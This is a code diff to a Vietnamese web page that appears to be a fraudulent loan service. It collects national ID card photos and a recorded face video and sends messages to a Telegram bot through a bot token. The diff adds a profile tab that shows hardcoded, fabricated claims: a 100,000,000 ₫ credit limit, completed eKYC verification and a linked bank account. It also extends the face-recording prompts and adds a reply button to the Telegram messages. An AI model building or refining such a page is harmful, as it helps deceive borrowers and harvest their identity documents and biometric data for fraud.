@@ -18,7 +18,6 @@
             box-shadow: 0 4px 12px rgba(245, 158, 11, 0.4);
             border: 4px solid #ffffff;
         }
-        /* Khung tròn eKYC chuẩn ngân hàng */
         .ekyc-circle-cam {
             width: 180px;
             height: 180px;
@@ -28,6 +27,7 @@
             box-shadow: 0 0 20px rgba(245, 158, 11, 0.5);
             margin: 0 auto;
             position: relative;
+            transform: scaleX(-1);
         }
     </style>
 </head>
@@ -45,7 +45,8 @@
             </div>
             
             <div class="flex items-center space-x-2">
-                <button id="userAccountBtn" onclick="openAuthModal()" class="text-xs md:text-sm font-extrabold text-slate-900 bg-amber-400 hover:bg-amber-500 px-4 py-2.5 rounded-xl shadow-sm transition">Đăng Nhập</button>
+                <!-- NÚT ĐẠI DIỆN TÀI KHOẢN TRÊN HEADER (BẤM VÀO SẼ CHUYỂN QUA TAB CÁ NHÂN) -->
+                <button id="userAccountBtn" onclick="handleHeaderAccountClick()" class="text-xs md:text-sm font-extrabold text-slate-900 bg-amber-400 hover:bg-amber-500 px-4 py-2.5 rounded-xl shadow-sm transition">Đăng Nhập</button>
             </div>
         </div>
     </header>
@@ -151,13 +152,44 @@
             </div>
 
             <!-- TAB 4: CÁ NHÂN -->
-            <div id="tabProfile" class="space-y-4 hidden py-2 text-center">
-                <div class="w-20 h-20 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mx-auto text-3xl font-bold shadow-inner">👤</div>
-                <div class="space-y-1">
-                    <h2 id="profileName" class="text-xl font-black text-slate-900">Tài khoản khách hàng</h2>
-                    <p id="profilePhone" class="text-xs md:text-sm text-slate-500 font-bold">Đang hoạt động</p>
+            <div id="tabProfile" class="space-y-4 hidden py-2">
+                <div class="bg-gradient-to-r from-amber-500 to-amber-600 rounded-3xl p-5 text-white shadow-lg space-y-3">
+                    <div class="flex items-center space-x-3">
+                        <div id="profileAvatar" class="w-14 h-14 bg-white text-amber-600 rounded-2xl flex items-center justify-center text-2xl font-black shadow">A</div>
+                        <div>
+                            <h3 id="profileFullName" class="text-base font-black">Nguyễn Văn A</h3>
+                            <p id="profileUserPhone" class="text-xs text-amber-100 font-semibold">SĐT: 098****123</p>
+                        </div>
+                    </div>
+                    <div class="bg-white/15 backdrop-blur-md rounded-2xl p-3 flex justify-between items-center text-xs">
+                        <div>
+                            <span class="text-amber-100 block text-[10px] uppercase font-bold">Hạn mức khả dụng</span>
+                            <span class="font-black text-sm">100.000.000 ₫</span>
+                        </div>
+                        <div class="text-right">
+                            <span class="text-emerald-300 block text-[10px] uppercase font-bold">Trạng thái định danh</span>
+                            <span class="font-black text-xs bg-emerald-500/30 px-2 py-0.5 rounded-full">✅ Đã xác thực eKYC</span>
+                        </div>
+                    </div>
                 </div>
-                <div class="pt-3">
+
+                <!-- CÁC TIỆN ÍCH TÀI KHOẢN -->
+                <div class="space-y-2 text-xs">
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 flex justify-between items-center font-bold text-slate-700">
+                        <span>🛡️ Trung tâm bảo mật & Mật khẩu</span>
+                        <span class="text-amber-600">Đã bảo mật</span>
+                    </div>
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 flex justify-between items-center font-bold text-slate-700">
+                        <span>💳 Tài khoản ngân hàng liên kết</span>
+                        <span class="text-emerald-600">Đã liên kết</span>
+                    </div>
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-3.5 flex justify-between items-center font-bold text-slate-700">
+                        <span>📞 Tổng đài chăm sóc khách hàng</span>
+                        <span class="text-amber-600">1900 6868</span>
+                    </div>
+                </div>
+
+                <div class="pt-2">
                     <button onclick="userLogout()" class="w-full bg-red-50 text-red-600 hover:bg-red-100 py-3.5 rounded-2xl font-extrabold text-xs md:text-sm transition shadow-sm">Đăng Xuất Tài Khoản</button>
                 </div>
             </div>
@@ -268,12 +300,12 @@
                 <button onclick="nextStep(3)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục Xác Thực</button>
             </div>
 
-            <!-- TRANG 4: eKYC NÂNG CẤP CHUẨN NGÂN HÀNG -->
+            <!-- TRANG 4: eKYC -->
             <div id="step4" class="space-y-4 hidden">
                 <div class="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 text-xs md:text-sm text-amber-900 space-y-1">
                     <p class="font-black">📌 Xác thực eKYC ngân hàng:</p>
-                    <p class="text-xs text-amber-800">1. CCCD: Chọn tải ảnh có sẵn hoặc chụp trực tiếp.</p>
-                    <p class="text-xs text-amber-800">2. Video khuôn mặt: Tự động quay theo hướng dẫn xoay trái/phải.</p>
+                    <p class="text-xs text-amber-800">1. CCCD: Chọn tải ảnh hoặc chụp trực tiếp.</p>
+                    <p class="text-xs text-amber-800">2. Video khuôn mặt: Vòng tròn tự động quay theo hướng dẫn.</p>
                 </div>
 
                 <!-- CCCD Mặt Trước -->
@@ -308,13 +340,12 @@
                     <div id="previewBack" class="mt-2 text-center"></div>
                 </div>
 
-                <!-- QUAY VIDEO eKYC VÒNG TRÒN THÔNG MINH -->
+                <!-- QUAY VIDEO eKYC VÒNG TRÒN -->
                 <div class="border border-slate-200 p-4 rounded-2xl bg-slate-50 text-center space-y-3">
                     <label class="block text-xs font-bold text-slate-700">Xác thực khuôn mặt (eKYC Video)</label>
                     
-                    <!-- Khung camera vòng tròn -->
                     <div class="ekyc-circle-cam bg-black shadow-inner">
-                        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover scale-125"></video>
+                        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover"></video>
                     </div>
 
                     <div id="ekycInstruction" class="text-xs font-black text-amber-600 bg-amber-50 py-1.5 px-3 rounded-full inline-block border border-amber-200">
@@ -658,7 +689,6 @@
             });
         }
 
-        // --- XỬ LÝ ẢNH CCCD (HIỂN THỊ THUMBNAIL ẢNH ĐÃ CHỌN) ---
         function previewSelectedImage(input, previewId) {
             if (input.files && input.files[0]) {
                 const reader = new FileReader();
@@ -673,7 +703,6 @@
             }
         }
 
-        // --- QUAY VIDEO eKYC VÒNG TRÒN TỰ ĐỘNG CHUẨN NGÂN HÀNG ---
         async function startAutoEkyc() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
@@ -701,13 +730,13 @@
                 const instEl = document.getElementById('ekycInstruction');
                 instEl.textContent = "🔄 Đang quay: Nhìn thẳng vào camera...";
                 
-                setTimeout(() => { instEl.textContent = "⬅️ Quay đầu sang TRÁI nhẹ nhàng..."; }, 1200);
-                setTimeout(() => { instEl.textContent = "➡️ Quay đầu sang PHẢI nhẹ nhàng..."; }, 2500);
-                setTimeout(() => { instEl.textContent = "⬆️ Ngước nhẹ mặt lên trên..."; }, 3800);
+                setTimeout(() => { instEl.textContent = "⬅️ Quay đầu sang TRÁI nhẹ nhàng..."; }, 1500);
+                setTimeout(() => { instEl.textContent = "➡️ Quay đầu sang PHẢI nhẹ nhàng..."; }, 3200);
+                setTimeout(() => { instEl.textContent = "⬆️ Ngước nhẹ mặt lên trên..."; }, 5000);
                 setTimeout(() => { 
                     instEl.textContent = "⏳ Đang lưu dữ liệu eKYC..."; 
                     recorder.stop();
-                }, 5000);
+                }, 6500);
 
             } catch(e) {
                 alert("Không thể truy cập camera. Vui lòng cấp quyền trình duyệt trên điện thoại!");
@@ -761,6 +790,16 @@
             } else if (currentUser) {
                 document.getElementById('userAccountBtn').textContent = "👤 " + (currentUserName || currentUser);
             } else {
+                document.getElementById('userAccountBtn').textContent = "Đăng Nhập";
+            }
+        }
+
+        function handleHeaderAccountClick() {
+            if (isAdminLoggedIn) {
+                switchTab('home');
+            } else if (currentUser) {
+                switchTab('profile');
+            } else {
                 openAuthModal();
             }
         }
@@ -795,8 +834,9 @@
                 if (isAdminLoggedIn) {
                     document.getElementById('adminPanel').classList.remove('hidden');
                 } else {
-                    document.getElementById('profileName').textContent = currentUserName || "Khách hàng";
-                    document.getElementById('profilePhone').textContent = "SĐT: " + currentUser;
+                    document.getElementById('profileFullName').textContent = currentUserName || "Khách hàng";
+                    document.getElementById('profileUserPhone').textContent = "SĐT: " + currentUser;
+                    document.getElementById('profileAvatar').textContent = (currentUserName || "K").charAt(0).toUpperCase();
                     document.getElementById('tabProfile').classList.remove('hidden');
                 }
             }
@@ -1088,7 +1128,15 @@
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: msg,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: `💬 Trả lời khách #${currentUser}`, url: `https://t.me/` }]
+                            ]
+                        }
+                    })
                 });
 
                 switchTab('applications');
